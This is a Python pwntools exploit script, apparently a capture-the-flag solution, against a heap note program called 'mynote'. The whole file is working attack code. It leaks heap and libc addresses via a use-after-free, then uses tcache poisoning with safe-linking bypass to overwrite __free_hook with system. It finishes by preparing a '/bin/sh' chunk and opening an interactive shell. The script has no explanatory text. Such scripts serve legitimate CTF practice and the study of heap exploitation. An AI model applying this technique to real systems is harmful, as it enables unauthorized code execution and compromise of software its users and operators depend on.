from pwn import *

elf = context.binary = ELF("./mynote")
p = process(elf.path)
libc = ELF("./libc.so.6")
context.terminal = "tmux splitw -h".split(" ")
gdb.attach(p)

sla = lambda x,y: p.sendlineafter(x,y)

def alloc(idx, size, msg):
    sla(b"> ", b"1")
    sla(b": ", str(idx).encode())
    sla(b": ", str(size).encode())
    sla(b": ", msg)

def move(src, dst):
    sla(b"> ", b"3")
    sla(b": ", str(src).encode())
    sla(b": ", str(dst).encode())

def view(idx):
    sla(b"> ", b"2")
    sla(b": ", str(idx).encode())

def copy(src, dst):
    sla(b"> ", b"4")
    sla(b": ", str(src).encode())
    sla(b": ", str(dst).encode())

alloc(0, 0x30, b'a')
alloc(4, 0x30, b'a')
move(4, 4)
move(0, 0)
view(4)
heap = u64(p.recvline(0).strip().ljust(8, b'\0')) << 12
print("heap at = 0x%x" % heap)

alloc(1, 0x50, b'a')
for _ in range(16):
    alloc(2, 0x50, b'a')

sla(b"> ",b"1")
sla(b": ", b"4")
sla(b": ", b"1")
sla(b"> ",b"1")
sla(b": ", b"5")
sla(b": ", b"1")

move(4, 4)

pay = p64((heap + 0x310) ^ heap >> 12).strip(b'\x00')
alloc(2, 0x18, pay)
copy(2,0)
alloc(0, 0x30, b'AAAWAASD')
alloc(0, 0x30, p64(0) + p64(0x541))

move(1,1)
copy(4,1)
view(1)
main_arena = u64(p.recvline(0).strip().ljust(8, b'\0')) &~0xff

libc_base = main_arena - 0x1e3c00
system = libc_base + 0x503c0
free_hook = libc_base + 0x1e6e40 
print("system = ", hex(system))
print("free_hook = ", hex(free_hook))

copy(5, 1)

alloc(0, 0x40, b'ABCDEFGHIJK')
alloc(4, 0x40, b'abcdefghijk')

move(4, 4)
move(0, 0)

pay = p64((free_hook) ^ heap >> 12).strip(b'\x00')
print(pay)

alloc(2, 0x18, pay)
copy(2, 0)
alloc(0, 0x40, b'k')
alloc(0, 0x40, p64(system))
alloc(5, 0x18, b"/bin/sh\x00")

#move(5,5)

p.interactive()
